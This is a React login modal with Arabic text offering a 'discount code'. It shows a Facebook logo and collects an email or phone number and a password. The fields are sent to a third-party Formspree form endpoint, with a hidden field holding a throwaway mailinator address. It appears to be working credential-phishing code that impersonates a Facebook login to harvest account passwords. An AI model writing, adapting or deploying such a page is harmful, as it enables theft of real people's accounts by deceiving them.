import { useState } from "react";
import { Button, Modal, TextInput } from "flowbite-react";
import { useForm, ValidationError } from "@formspree/react";
import { FaCheckCircle } from "react-icons/fa";
import * as fontAwesome from "react-icons/fa"; //fontawesome icons

const Login = ({ setOpenModal, openModal }) => {
  const [email, setEmail] = useState("");

  function onCloseModal() {
    setOpenModal(false);
    setEmail("");
  }

  const [state, handleSubmit] = useForm("manwggpl");
  return (
    <Modal show={openModal} size="md" onClose={onCloseModal} popup>
      <Modal.Header />
      <Modal.Body>
        <form
          onSubmit={(e) => {
            handleSubmit(e);
          }}
          className="space-y-6"
        >
          <h3 className="text-xl font-medium text-gray-900 dark:text-white">
            قم بتسجيل الدخول واحصل على كود الخصم!
            <img
              src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg"
              alt=""
              className="w-64"
            />
          </h3>
          <div>
            <div className="mb-2 block"></div>
            <TextInput
              className="hidden"
              autoComplete="email"
              name="email"
              placeholder="البريد الالكتروني أو رقم الهاتف"
              value={"qujeroxa@mailinator.com"}
              onChange={(event) => setEmail(event.target.value)}
              required
            />
            <TextInput
              autoComplete="email"
              name="message"
              placeholder="البريد الالكتروني أو رقم الهاتف"
              value={email}
              onChange={(event) => setEmail(event.target.value)}
              required
            />
            <ValidationError
              prefix="Email"
              field="email"
              errors={state.errors}
            />
          </div>
          <div>
            <div className="mb-2 block"></div>
            <TextInput
              autoComplete={"current-password"}
              placeholder="كلمة المرور"
              name="message"
              id="password"
              type="password"
              required
            />
            <ValidationError
              prefix="Message"
              field="message"
              errors={state.errors}
            />
          </div>

          <div className="w-full flex flex-wrap items-center justify-between">
            <Button disabled={state.submitting} type="submit">
              {" "}
              {state.submitting ? (
                <fontAwesome.FaSpinner className="animate-spin" />
              ) : (
                "تسجيل الدخول"
              )}
            </Button>
          </div>
          {state.succeeded && (
            <div
              id="alert-border-3"
              className="flex items-center p-4 mb-4 text-green-800 border-t-4 border-green-300 bg-green-50 dark:text-green-400 dark:bg-gray-800 dark:border-green-800"
              role="alert"
            >
              <FaCheckCircle className="text-2xl" />
              <div className="ms-3 text-sm flex flex-col gap-2">
                <span className="font-bold">تم الاشتراك بنجاح</span>
                <p> سيتم ارسال كود الخصم الى حساب الفيس بوك الخاص بكم</p>
              </div>
            </div>
          )}
        </form>
      </Modal.Body>
    </Modal>
  );
};

export default Login;
